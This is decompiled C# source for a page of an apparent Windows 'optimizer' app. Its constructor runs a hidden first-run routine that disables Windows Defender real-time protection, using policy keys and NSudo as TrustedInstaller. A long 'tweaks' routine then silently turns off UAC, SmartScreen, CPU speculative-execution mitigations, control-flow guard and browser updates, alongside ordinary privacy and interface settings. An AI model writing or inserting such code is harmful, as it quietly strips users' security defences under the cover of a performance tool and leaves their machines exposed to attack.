using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Markup;
using System.Xml;
using Microsoft.Win32;
using ModernMessageBoxLib;

namespace Page_Navigation_App.View
{
	// Token: 0x02000006 RID: 6
	public class Products : UserControl, IComponentConnector
	{
		// Token: 0x06000019 RID: 25 RVA: 0x0000254E File Offset: 0x0000074E
		public Products()
		{
			this.InitializeComponent();
			this.FirstRun();
		}

		// Token: 0x0600001A RID: 26
		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

		// Token: 0x0600001B RID: 27 RVA: 0x00002584 File Offset: 0x00000784
		[DebuggerStepThrough]
		private void FirstRun()
		{
			Products.<FirstRun>d__4 <FirstRun>d__ = new Products.<FirstRun>d__4();
			<FirstRun>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<FirstRun>d__.<>4__this = this;
			<FirstRun>d__.<>1__state = -1;
			<FirstRun>d__.<>t__builder.Start<Products.<FirstRun>d__4>(ref <FirstRun>d__);
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000025C0 File Offset: 0x000007C0
		private void Startfirstrun()
		{
			Thread.Sleep(2000);
			bool flag = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Xilly Ops", true).GetValue("FirstRun") != null;
			if (flag)
			{
				RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", true);
				subKey.SetValue("DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
				subKey.Close();
				Process DisableDef = new Process();
				DisableDef.StartInfo.FileName = Path.GetTempPath() + "NSudoLG.exe";
				DisableDef.StartInfo.Arguments = "-U:T Reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f";
				DisableDef.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				DisableDef.StartInfo.CreateNoWindow = true;
				DisableDef.Start();
				DisableDef.WaitForExit();
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Xilly Ops", true);
				registryKey.SetValue("FirstRun", "False", RegistryValueKind.String);
				registryKey.Close();
			}
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000026B0 File Offset: 0x000008B0
		[DebuggerStepThrough]
		private void Activatebutton_Click(object sender, RoutedEventArgs e)
		{
			Products.<Activatebutton_Click>d__6 <Activatebutton_Click>d__ = new Products.<Activatebutton_Click>d__6();
			<Activatebutton_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Activatebutton_Click>d__.<>4__this = this;
			<Activatebutton_Click>d__.sender = sender;
			<Activatebutton_Click>d__.e = e;
			<Activatebutton_Click>d__.<>1__state = -1;
			<Activatebutton_Click>d__.<>t__builder.Start<Products.<Activatebutton_Click>d__6>(ref <Activatebutton_Click>d__);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000026F7 File Offset: 0x000008F7
		private void GraphicsButton_Click(object sender, RoutedEventArgs e)
		{
			this.StartGPU();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00002701 File Offset: 0x00000901
		private void WindowsButton_Click(object sender, RoutedEventArgs e)
		{
			this.StartWindowsTweaks();
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000270C File Offset: 0x0000090C
		[DebuggerStepThrough]
		private void StartWindowsTweaks()
		{
			Products.<StartWindowsTweaks>d__9 <StartWindowsTweaks>d__ = new Products.<StartWindowsTweaks>d__9();
			<StartWindowsTweaks>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<StartWindowsTweaks>d__.<>4__this = this;
			<StartWindowsTweaks>d__.<>1__state = -1;
			<StartWindowsTweaks>d__.<>t__builder.Start<Products.<StartWindowsTweaks>d__9>(ref <StartWindowsTweaks>d__);
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002748 File Offset: 0x00000948
		private void ApplyingWinTweaks()
		{
			Thread.Sleep(2000);
			Process adwcleaner = new Process();
			adwcleaner.StartInfo.FileName = Path.GetTempPath() + "adwcleaner.exe";
			adwcleaner.StartInfo.Arguments = "/eula /clean /noreboot /preinstalled";
			adwcleaner.StartInfo.CreateNoWindow = true;
			adwcleaner.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			adwcleaner.Start();
			adwcleaner.WaitForExit();
			RegistryKey edge = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Edge", true);
			edge.SetValue("StartupBoostEnabled", "0", RegistryValueKind.DWord);
			edge.SetValue("HardwareAccelerationModeEnabled", "0", RegistryValueKind.DWord);
			edge.SetValue("BackgroundModeEnabled", "0", RegistryValueKind.DWord);
			edge.Close();
			RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\MicrosoftEdgeElevationService", true);
			subKey2.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey2.Close();
			RegistryKey subKey3 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\edgeupdate", true);
			subKey3.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey3.Close();
			RegistryKey subKey4 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\edgeupdatem", true);
			subKey4.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey4.Close();
			RegistryKey subKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Google\\Chrome", true);
			subKey5.SetValue("StartupBoostEnabled", "0", RegistryValueKind.DWord);
			subKey5.SetValue("BackgroundModeEnabled", "0", RegistryValueKind.DWord);
			subKey5.Close();
			RegistryKey subKey6 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\GoogleChromeElevationService", true);
			subKey6.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey6.Close();
			RegistryKey subKey7 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\gupdate", true);
			subKey7.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey7.Close();
			RegistryKey subKey8 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\gupdatem", true);
			subKey8.SetValue("Start", "4", RegistryValueKind.DWord);
			subKey8.Close();
			RegistryKey subKey9 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers\\Scheduler", true);
			subKey9.SetValue("EnablePreemption", "0", RegistryValueKind.DWord);
			subKey9.Close();
			RegistryKey webdisable = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", true);
			webdisable.SetValue("EnableWebContentEvaluation", "0", RegistryValueKind.DWord);
			webdisable.Close();
			RegistryKey SmartScreen2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Edge\\SmartScreenEnabled", true);
			SmartScreen2.SetValue("@", "0", RegistryValueKind.DWord);
			SmartScreen2.Close();
			RegistryKey subKey10 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\WindowsStore", true);
			subKey10.SetValue("AutoDownload", "2", RegistryValueKind.DWord);
			subKey10.Close();
			RegistryKey subKey11 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\TextInput", true);
			subKey11.SetValue("AllowLinguisticDataCollection", "0", RegistryValueKind.DWord);
			subKey11.Close();
			RegistryKey subKey12 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
			subKey12.SetValue("TaskbarMn", "0", RegistryValueKind.DWord);
			subKey12.SetValue("ShowTaskViewButton", "0", RegistryValueKind.DWord);
			subKey12.Close();
			RegistryKey subKey13 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
			subKey13.SetValue("HideSCAMeetNow", "1", RegistryValueKind.DWord);
			subKey13.Close();
			RegistryKey subKey14 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Feeds", true);
			subKey14.SetValue("EnableFeeds", "0", RegistryValueKind.DWord);
			subKey14.Close();
			RegistryKey subKey15 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Dsh", true);
			subKey15.SetValue("AllowNewsAndInterests", "0", RegistryValueKind.DWord);
			subKey15.Close();
			RegistryKey subKey16 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop", true);
			subKey16.SetValue("EnablePerProcessSystemDPI", "0", RegistryValueKind.DWord);
			subKey16.Close();
			RegistryKey subKey17 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Multimedia\\Audio", true);
			subKey17.SetValue("UserDuckingPreference", "3", RegistryValueKind.DWord);
			subKey17.Close();
			RegistryKey subKey18 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\VideoSettings", true);
			subKey18.SetValue("VideoQualityOnBattery", "1", RegistryValueKind.DWord);
			subKey18.Close();
			RegistryKey subKey19 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
			subKey19.SetValue("TaskbarAnimations", "0", RegistryValueKind.DWord);
			subKey19.Close();
			RegistryKey subKey20 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop\\WindowMetrics", true);
			subKey20.SetValue("MinAnimate", "0", RegistryValueKind.DWord);
			subKey20.Close();
			RegistryKey subKey21 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
			subKey21.SetValue("fAllowUnsolicited", "0", RegistryValueKind.DWord);
			subKey21.SetValue("fAllowToGetHelp", "0", RegistryValueKind.DWord);
			subKey21.SetValue("UseBandwidthOptimization", "0", RegistryValueKind.DWord);
			subKey21.SetValue("LoggingEnabled", "0", RegistryValueKind.DWord);
			subKey21.Close();
			RegistryKey subKey22 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\ScheduledDiagnostics", true);
			subKey22.SetValue("EnabledExecution", "0", RegistryValueKind.DWord);
			subKey22.Close();
			RegistryKey subKey23 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\GameBar", true);
			subKey23.SetValue("ShowStartupPanel", "0", RegistryValueKind.DWord);
			subKey23.SetValue("GamePanelStartupTipIndex", "3", RegistryValueKind.DWord);
			subKey23.SetValue("AutoGameModeEnabled", "1", RegistryValueKind.DWord);
			subKey23.Close();
			RegistryKey subKey24 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\StorageSense", true);
			subKey24.SetValue("AllowStorageSenseGlobal", "0", RegistryValueKind.DWord);
			subKey24.SetValue("AllowStorageSenseTemporaryFilesCleanup", "0", RegistryValueKind.DWord);
			subKey24.Close();
			RegistryKey subKey25 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Speech_OneCore\\Settings\\VoiceActivation\\UserPreferenceForAllApps", true);
			subKey25.SetValue("AgentActivationEnabled", "0", RegistryValueKind.DWord);
			subKey25.SetValue("AgentActivationOnLockScreenEnabled", "0", RegistryValueKind.DWord);
			subKey25.SetValue("AgentActivationLastUsed", "0", RegistryValueKind.DWord);
			subKey25.Close();
			RegistryKey subKey26 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\PushNotifications", true);
			subKey26.SetValue("NoCloudApplicationNotification", "1", RegistryValueKind.DWord);
			subKey26.Close();
			RegistryKey subKey27 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
			subKey27.SetValue("AllowOnlineTips", "0", RegistryValueKind.DWord);
			subKey27.Close();
			RegistryKey subKey28 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\TabletPC", true);
			subKey28.SetValue("PreventHandwritingDataSharing", "1", RegistryValueKind.DWord);
			subKey28.Close();
			RegistryKey subKey29 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\HandwritingErrorReports", true);
			subKey29.SetValue("PreventHandwritingErrorReports", "1", RegistryValueKind.DWord);
			subKey29.Close();
			RegistryKey subKey30 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Error Reporting", true);
			subKey30.SetValue("Disabled", "1", RegistryValueKind.DWord);
			subKey30.Close();
			RegistryKey erroreporting = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\PCHealth\\ErrorReporting", true);
			erroreporting.SetValue("DoReport", "0", RegistryValueKind.DWord);
			erroreporting.Close();
			RegistryKey subKey31 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\DriverSearching", true);
			subKey31.SetValue("DontSearchWindowsUpdate", "1", RegistryValueKind.DWord);
			subKey31.Close();
			RegistryKey subKey32 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
			subKey32.SetValue("EnableFirstLogonAnimation", "0", RegistryValueKind.DWord);
			subKey32.Close();
			RegistryKey subKey33 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System", true);
			subKey33.SetValue("DisableLockScreenAppNotifications", "1", RegistryValueKind.DWord);
			subKey33.Close();
			RegistryKey subKey34 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", true);
			subKey34.SetValue("NoWindowMinimizingShortcuts", "1", RegistryValueKind.DWord);
			subKey34.Close();
			RegistryKey subKey35 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
			subKey35.SetValue("NoInstrumentation", "1", RegistryValueKind.DWord);
			subKey35.SetValue("NoBalloonFeatureAdvertisements", "1", RegistryValueKind.DWord);
			subKey35.SetValue("TaskbarNoNotification", "1", RegistryValueKind.DWord);
			subKey35.Close();
			RegistryKey subKey36 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", true);
			subKey36.SetValue("HidePeopleBar", "1", RegistryValueKind.DWord);
			subKey36.Close();
			RegistryKey subKey37 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\DeliveryOptimization", true);
			subKey37.SetValue("DODownloadMode", "0", RegistryValueKind.DWord);
			subKey37.Close();
			RegistryKey subKey38 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\InputPersonalization", true);
			subKey38.SetValue("AllowInputPersonalization", "0", RegistryValueKind.DWord);
			subKey38.Close();
			RegistryKey subKey39 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\LooselyCoupled", true);
			subKey39.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey39.Close();
			RegistryKey subKey40 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", true);
			subKey40.SetValue("DisablePagingExecutive", "1", RegistryValueKind.DWord);
			subKey40.SetValue("EnableCfg", "0", RegistryValueKind.DWord);
			subKey40.SetValue("LargeSystemCache", "0", RegistryValueKind.DWord);
			subKey40.SetValue("FeatureSettings", "1", RegistryValueKind.DWord);
			subKey40.SetValue("FeatureSettingsOverride", "3", RegistryValueKind.DWord);
			subKey40.SetValue("FeatureSettingsOverrideMask", "3", RegistryValueKind.DWord);
			subKey40.Close();
			RegistryKey subKey41 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DriverSearching", true);
			subKey41.SetValue("SearchOrderConfig", "0", RegistryValueKind.DWord);
			subKey41.Close();
			RegistryKey subKey42 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
			subKey42.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
			subKey42.Close();
			RegistryKey subKey43 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\QuietHours", true);
			subKey43.SetValue("Enable", "0", RegistryValueKind.DWord);
			subKey43.Close();
			RegistryKey subKey44 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\PushNotifications", true);
			subKey44.SetValue("NoTileApplicationNotification", "1", RegistryValueKind.DWord);
			subKey44.SetValue("DatabaseMigrationCompleted", "1", RegistryValueKind.DWord);
			subKey44.SetValue("ToastEnabled", "0", RegistryValueKind.DWord);
			subKey44.SetValue("LockScreenToastEnabled", "0", RegistryValueKind.DWord);
			subKey44.SetValue("NoToastApplicationNotificationOnLockScreen", "1", RegistryValueKind.DWord);
			subKey44.Close();
			RegistryKey subKey45 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\PushNotifications", true);
			subKey45.SetValue("ToastEnabled", "0", RegistryValueKind.DWord);
			subKey45.Close();
			RegistryKey subKey46 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Privacy", true);
			subKey46.SetValue("TailoredExperiencesWithDiagnosticDataEnabled", "0", RegistryValueKind.DWord);
			subKey46.Close();
			RegistryKey subKey47 = Registry.LocalMachine.CreateSubKey("SYSTEM\\Maps", true);
			subKey47.SetValue("AutoUpdateEnabled", "0", RegistryValueKind.DWord);
			subKey47.Close();
			RegistryKey subKey48 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\CDP", true);
			subKey48.SetValue("CdpSessionUserAuthzPolicy", "0", RegistryValueKind.DWord);
			subKey48.SetValue("NearShareChannelUserAuthzPolicy", "0", RegistryValueKind.DWord);
			subKey48.SetValue("RomeSdkChannelUserAuthzPolicy", "0", RegistryValueKind.DWord);
			subKey48.Close();
			RegistryKey subKey49 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer", true);
			subKey49.SetValue("DisableNotificationCenter", "1", RegistryValueKind.DWord);
			subKey49.Close();
			RegistryKey subKey50 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search", true);
			subKey50.SetValue("AllowCortana", "0", RegistryValueKind.DWord);
			subKey50.Close();
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\VideoSettings", true);
				registryKey.SetValue("VideoQualityOnBattery", "1", RegistryValueKind.DWord);
				registryKey.Close();
			}
			catch
			{
			}
			RegistryKey subKey51 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\DirectX\\UserGpuPreferences", true);
			subKey51.SetValue("DirectXUserGlobalSettings", "VRROptimizeEnable=0;", RegistryValueKind.String);
			subKey51.Close();
			RegistryKey subKey52 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers", true);
			subKey52.SetValue("HwSchMode", "0", RegistryValueKind.DWord);
			subKey52.Close();
			RegistryKey subKey53 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\AdvertisingInfo", true);
			subKey53.SetValue("DisabledByGroupPolicy", "1", RegistryValueKind.DWord);
			subKey53.Close();
			RegistryKey subKey54 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo", true);
			subKey54.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey54.Close();
			RegistryKey subKey55 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\TabletPC", true);
			subKey55.SetValue("TurnOffTouchInput", "1", RegistryValueKind.DWord);
			subKey55.SetValue("TurnOffPanning", "1", RegistryValueKind.DWord);
			subKey55.Close();
			RegistryKey subKey56 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\TextInput", true);
			subKey56.SetValue("AllowLinguisticDataCollection", "0", RegistryValueKind.DWord);
			subKey56.Close();
			RegistryKey subKey57 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\WindowsInkWorkspace", true);
			subKey57.SetValue("AllowWindowsInkWorkspace", "0", RegistryValueKind.DWord);
			subKey57.Close();
			RegistryKey subKey58 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\AppPrivacy", true);
			subKey58.SetValue("LetAppsAccessAccountInfo", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessGazeInput", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessCallHistory", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessContacts", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsGetDiagnosticInfo", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessEmail", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessLocation", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessMessaging", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessMotion", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessNotifications", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessTasks", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessCalendar", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessTrustedDevices", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessBackgroundSpatialPerception", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsActivateWithVoice", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsActivateWithVoiceAboveLock", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsSyncWithDevices", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessRadios", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsAccessPhone", "2", RegistryValueKind.DWord);
			subKey58.SetValue("LetAppsRunInBackground", "2", RegistryValueKind.DWord);
			subKey58.Close();
			RegistryKey subKey59 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
			subKey59.SetValue("NoDriveTypeAutoRun", "255", RegistryValueKind.DWord);
			subKey59.SetValue("NoAutorun", "1", RegistryValueKind.DWord);
			subKey59.Close();
			RegistryKey subKey60 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\CloudContent", true);
			subKey60.SetValue("DisableSoftLanding", "1", RegistryValueKind.DWord);
			subKey60.SetValue("DisableCloudOptimizedContent", "1", RegistryValueKind.DWord);
			subKey60.Close();
			RegistryKey subKey61 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\FileHistory", true);
			subKey61.SetValue("Disabled", "1", RegistryValueKind.DWord);
			subKey61.Close();
			RegistryKey subKey62 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Settings\\FindMyDevice", true);
			subKey62.SetValue("LocationSyncEnabled", "0", RegistryValueKind.DWord);
			subKey62.SetValue("AllowFindMyDevice", "0", RegistryValueKind.DWord);
			subKey62.Close();
			RegistryKey subKey63 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Biometrics", true);
			subKey63.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey63.Close();
			RegistryKey subKey64 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Maps", true);
			subKey64.SetValue("AutoDownloadAndUpdateMapData", "0", RegistryValueKind.DWord);
			subKey64.SetValue("AllowUntriggeredNetworkTrafficOnSettingsPage", "0", RegistryValueKind.DWord);
			subKey64.Close();
			RegistryKey subKey65 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{C1D23ACC-752B-43E5-8448-8D0E519CD6D6}", true);
			subKey65.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey65.Close();
			RegistryKey subKey66 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{2297E4E2-5DBE-466D-A12B-0F8286F0D9CA}", true);
			subKey66.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey66.Close();
			RegistryKey subKey67 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{E5323777-F976-4f5b-9B55-B94699C46E44}", true);
			subKey67.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey67.Close();
			RegistryKey subKey68 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{2EEF81BE-33FA-4800-9670-1CD474972C3F}", true);
			subKey68.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey68.Close();
			RegistryKey subKey69 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{52079E78-A92B-413F-B213-E8FE35712E72}", true);
			subKey69.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey69.Close();
			RegistryKey subKey70 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{7D7E8402-7C54-4821-A34E-AEEFD62DED93}", true);
			subKey70.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey70.Close();
			RegistryKey subKey71 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{D89823BA-7180-4B81-B50C-7E471E6121A3}", true);
			subKey71.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey71.Close();
			RegistryKey subKey72 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{8BC668CF-7728-45BD-93F8-CF2B3B41D7AB}", true);
			subKey72.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey72.Close();
			RegistryKey subKey73 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{9231CB4C-BF57-4AF3-8C55-FDA7BFCC04C5}", true);
			subKey73.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey73.Close();
			RegistryKey subKey74 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{E390DF20-07DF-446D-B962-F5C953062741}", true);
			subKey74.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey74.Close();
			RegistryKey subKey75 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{992AFA70-6F47-4148-B3E9-3003349C1548}", true);
			subKey75.SetValue("Value", "Deny", RegistryValueKind.String);
			subKey75.Close();
			RegistryKey subKey76 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Assistance\\Client\\1.0", true);
			subKey76.SetValue("NoActiveHelp", "1", RegistryValueKind.DWord);
			subKey76.Close();
			RegistryKey subKey77 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search", true);
			subKey77.SetValue("DisableWebSearch", "1", RegistryValueKind.DWord);
			subKey77.SetValue("DisableRemovableDriveIndexing", "1", RegistryValueKind.DWord);
			subKey77.SetValue("AllowCortanaAboveLock", "0", RegistryValueKind.DWord);
			subKey77.SetValue("AllowCloudSearch", "0", RegistryValueKind.DWord);
			subKey77.SetValue("AllowSearchToUseLocation", "0", RegistryValueKind.DWord);
			subKey77.SetValue("ConnectedSearchUseWeb", "0", RegistryValueKind.DWord);
			subKey77.Close();
			RegistryKey subKey78 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\SearchSettings", true);
			subKey78.SetValue("SafeSearchMode", "0", RegistryValueKind.DWord);
			subKey78.SetValue("IsDeviceSearchHistoryEnabled", "0", RegistryValueKind.DWord);
			subKey78.Close();
			RegistryKey subKey79 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Speech", true);
			subKey79.SetValue("AllowSpeechModelUpdate", "0", RegistryValueKind.DWord);
			subKey79.Close();
			RegistryKey subKey80 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters", true);
			subKey80.SetValue("EnableBoottrace", "0", RegistryValueKind.DWord);
			subKey80.SetValue("EnablePrefetcher", "0", RegistryValueKind.DWord);
			subKey80.Close();
			RegistryKey subKey81 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Superfetch/Main", true);
			subKey81.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey81.Close();
			RegistryKey subKey82 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Superfetch/PfApLog", true);
			subKey82.SetValue("Enabled", "0", RegistryValueKind.DWord);
			subKey82.Close();
